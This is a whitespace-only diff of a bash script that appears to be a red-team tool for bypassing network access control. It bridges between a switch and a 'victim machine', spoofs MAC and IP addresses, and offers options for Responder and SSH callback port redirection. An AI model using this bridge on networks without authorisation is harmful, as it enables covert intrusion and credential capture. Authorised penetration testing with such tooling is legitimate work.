@@ -30,24 +30,24 @@ COMPINT=eth1 # network interface plugged into victim machine
 
 ## Set initial SWMAC value, is set during initialisation
 if [ "$RANDOMIZE" -eq 0 ]; then
-  SWMAC=00:11:22:33:44:55
+    SWMAC=00:11:22:33:44:55
 else
-  SWMAC=$(printf '02:%02x:%02x:%02x:%02x:%02x\n' $((RANDOM % 256)) $((RANDOM % 256)) $((RANDOM % 256)) $((RANDOM % 256)) $((RANDOM % 256)))
+    SWMAC=$(printf '02:%02x:%02x:%02x:%02x:%02x\n' $((RANDOM % 256)) $((RANDOM % 256)) $((RANDOM % 256)) $((RANDOM % 256)) $((RANDOM % 256)))
 fi
 
 ## Set IP addresses for bridge
 if [ "$RANDOMIZE" -eq 0 ]; then
-  BRIP=169.254.66.66 # IP address for the bridge
-  BRGW=169.254.66.1 # Gateway IP address for the bridge
+    BRIP=169.254.66.66 # IP address for the bridge
+    BRGW=169.254.66.1 # Gateway IP address for the bridge
 else
-  THIRD_OCTET=$(( (RANDOM % 254) + 1 ))
-  while :; do
-    LAST_OCTED=$(( RANDOM % 256 ))
-    # avoid .0, .1, .255 for the "random" one so it doesn't collide with the first IP or be a broadcast/network addr
-    [[ $LAST_OCTED -ne 0 && $LAST_OCTED -ne 1 && $LAST_OCTED -ne 255 ]] && break
-  done
-  BRIP="169.254.${THIRD_OCTET}.${LAST_OCTED}" # IP address for the bridge
-  BRGW="169.254.${THIRD_OCTET}.1" # Gateway IP address for the bridge
+    THIRD_OCTET=$(( (RANDOM % 254) + 1 ))
+    while :; do
+        LAST_OCTED=$(( RANDOM % 256 ))
+        # avoid .0, .1, .255 for the "random" one so it doesn't collide with the first IP or be a broadcast/network addr
+        [[ $LAST_OCTED -ne 0 && $LAST_OCTED -ne 1 && $LAST_OCTED -ne 255 ]] && break
+    done
+    BRIP="169.254.${THIRD_OCTET}.${LAST_OCTED}" # IP address for the bridge
+    BRGW="169.254.${THIRD_OCTET}.1" # Gateway IP address for the bridge
 fi
 
 TEMP_FILE=/tmp/tcpdump.pcap
@@ -88,84 +88,84 @@ RANGE=61000-62000 #Ports for my traffic on NAT
 
 ## display usage hints
 Usage() {
-  echo -e "$0 v$VERSION usage:"
-  echo "    -1 <eth>    network interface plugged into switch"
-  echo "    -2 <eth>    network interface plugged into victim machine"
-  echo "    -a          autonomous mode"
-  echo "    -c          start connection setup only"
-  echo "    -g <MAC>    set gateway MAC address (GWMAC) manually"
-  echo "    -t <MAC>    set target (printer or computer) MAC address (COMMAC) manually"
-  echo "    -T <IP>     set target (printer or computer) IP address (COMIP) manually"
-  echo "    -f <RANGE>  filter out all outbound connection except on this range (cautious mode, for Red Team)"
-  echo "    -s <IP>     set source IP address for communication with COMP. WARNING: IP address must exist, for supplicant ARP request to succeed"
-  echo "    -h          display this help"
-  echo "    -i          start initial setup only"
-  echo "    -r          reset all settings"
-  echo "    -R          enable port redirection for Responder"
-  echo "    -S          enable port redirection for OpenSSH and start the service"
-  exit 0
+    echo -e "$0 v$VERSION usage:"
+    echo "    -1 <eth>    network interface plugged into switch"
+    echo "    -2 <eth>    network interface plugged into victim machine"
+    echo "    -a          autonomous mode"
+    echo "    -c          start connection setup only"
+    echo "    -g <MAC>    set gateway MAC address (GWMAC) manually"
+    echo "    -t <MAC>    set target (printer or computer) MAC address (COMMAC) manually"
+    echo "    -T <IP>     set target (printer or computer) IP address (COMIP) manually"
+    echo "    -f <RANGE>  filter out all outbound connection except on this range (cautious mode, for Red Team)"
+    echo "    -s <IP>     set source IP address for communication with COMP. WARNING: IP address must exist, for supplicant ARP request to succeed"
+    echo "    -h          display this help"
+    echo "    -i          start initial setup only"
+    echo "    -r          reset all settings"
+    echo "    -R          enable port redirection for Responder"
+    echo "    -S          enable port redirection for OpenSSH and start the service"
+    exit 0
 }
 
 ## display version info
 Version() {
-  echo -e "$0 v$VERSION"
-  exit 0
+    echo -e "$0 v$VERSION"
+    exit 0
 }
 
 ## Check if we got all needed parameters
 CheckParams() {
-  while getopts ":1:2:acg:f:s:t:T:hirRS" opts
+    while getopts ":1:2:acg:f:s:t:T:hirRS" opts
     do
-      case "$opts" in
-        "1")
-          SWINT=$OPTARG
-          ;;
-        "2")
-          COMPINT=$OPTARG
-          ;;
-        "a")
-          OPTION_AUTONOMOUS=1
-          ;;
-        "c")
-          OPTION_CONNECTION_SETUP_ONLY=1
-          ;;
-        "g")
-          GWMAC=$OPTARG
-          ;;
-        "t")
-          COMPMAC=$OPTARG
-          ;;
-        "T")
-          COMIP=$OPTARG
-          ;;
-        "f")
-          RESTRICT_TO_DEST_RANGE=$OPTARG
-          ;;
-        "s")
-          TO_COMP_SOURCE_IP=$OPTARG
-          ;;
-        "h")
-          Usage
-          ;;
-        "i")
-          OPTION_INITIAL_SETUP_ONLY=1
-          ;;
-        "r")
-          OPTION_RESET=1
-          ;;
-        "R")
-          OPTION_RESPONDER=1
-          ;;
-        "S")
-          OPTION_SSH=1
-          ;;
-        *)
-          OPTION_RESPONDER=0
-          OPTION_SSH=0
-          OPTION_AUTONOMOUS=0
-          ;;
-      esac
-  done
+        case "$opts" in
+            "1")
+                SWINT=$OPTARG
+                ;;
+            "2")
+                COMPINT=$OPTARG
+                ;;
+            "a")
+                OPTION_AUTONOMOUS=1
+                ;;
+            "c")
+                OPTION_CONNECTION_SETUP_ONLY=1
+                ;;
+            "g")
+                GWMAC=$OPTARG
+                ;;
+            "t")
+                COMPMAC=$OPTARG
+                ;;
+            "T")
+                COMIP=$OPTARG
+                ;;
+            "f")
+                RESTRICT_TO_DEST_RANGE=$OPTARG
+                ;;
+            "s")
+                TO_COMP_SOURCE_IP=$OPTARG
+                ;;
+            "h")
+                Usage
+                ;;
+            "i")
+                OPTION_INITIAL_SETUP_ONLY=1
+                ;;
+            "r")
+                OPTION_RESET=1
+                ;;
+            "R")
+                OPTION_RESPONDER=1
+                ;;
+            "S")
+                OPTION_SSH=1
+                ;;
+            *)
+                OPTION_RESPONDER=0
+                OPTION_SSH=0
+                OPTION_AUTONOMOUS=0
+                ;;
+        esac
+    done
 }
 
 InitialSetup() {
@@ -195,7 +195,7 @@ InitialSetup() {
     # Turn off multicast to prevent initial IGMP messages
     ip link set $SWINT multicast off
     ip link set $COMPINT multicast off
-    
+
     # Stop NTP services
     declare -a NTP_SERVICES=("ntp.service" "ntpsec.service" "chronyd.service" "systemd-timesyncd.service")
     for NTP_SERVICE in "${NTP_SERVICES[@]}"
@@ -239,7 +239,7 @@ InitialSetup() {
         modprobe br_netfilter 2>/dev/null
         sleep 1
     fi
-    
+
     if [ -d /proc/sys/net/bridge ]; then
         echo 1 > /proc/sys/net/bridge/bridge-nf-call-iptables
     else
@@ -259,7 +259,7 @@ InitialSetup() {
     ## Bringing up the Bridge
     ifconfig $BRINT 0.0.0.0 up promisc
 
-    ## Set default iptables forward policy to ACCEPT to avoid bridge from being non functional 
+    ## Set default iptables forward policy to ACCEPT to avoid bridge from being non functional
     $CMD_IPTABLES -P FORWARD ACCEPT
 
     if [ "$OPTION_AUTONOMOUS" -eq 0 ]; then
@@ -356,9 +356,9 @@ ConnectionSetup() {
     arp -s -i $BRINT $BRGW $GWMAC
     # In case filter ou mode is spceified, we only route traffic in the defined range
     if [ -n "$RESTRICT_TO_DEST_RANGE" ]; then
-      ip route add $RESTRICT_TO_DEST_RANGE via $BRGW dev $BRINT metric 10
+        ip route add $RESTRICT_TO_DEST_RANGE via $BRGW dev $BRINT metric 10
     else
-      ip route add default via $BRGW dev $BRINT metric 10
+        ip route add default via $BRGW dev $BRINT metric 10
     fi
 
     ## SSH CALLBACK if we receive inbound on br0 for VICTIMIP:DPORT forward to BRIP on SSH
@@ -427,10 +427,10 @@ ConnectionSetup() {
 
     ## Cautious-mode filtering rules
     if [ -n "$RESTRICT_TO_DEST_RANGE" ]; then
-      # Allow only selected outbound traffic from your machine
-      $CMD_IPTABLES -A OUTPUT -o $BRINT -s $BRIP -d $RESTRICT_TO_DEST_RANGE -j ACCEPT
-      # Drop all the rest
-      $CMD_IPTABLES -A OUTPUT -o $BRINT -s $BRIP -j DROP
+        # Allow only selected outbound traffic from your machine
+        $CMD_IPTABLES -A OUTPUT -o $BRINT -s $BRIP -d $RESTRICT_TO_DEST_RANGE -j ACCEPT
+        # Drop all the rest
+        $CMD_IPTABLES -A OUTPUT -o $BRINT -s $BRIP -j DROP
     fi
 
     ## Re-enabling traffic flow; monitor ports for lockout
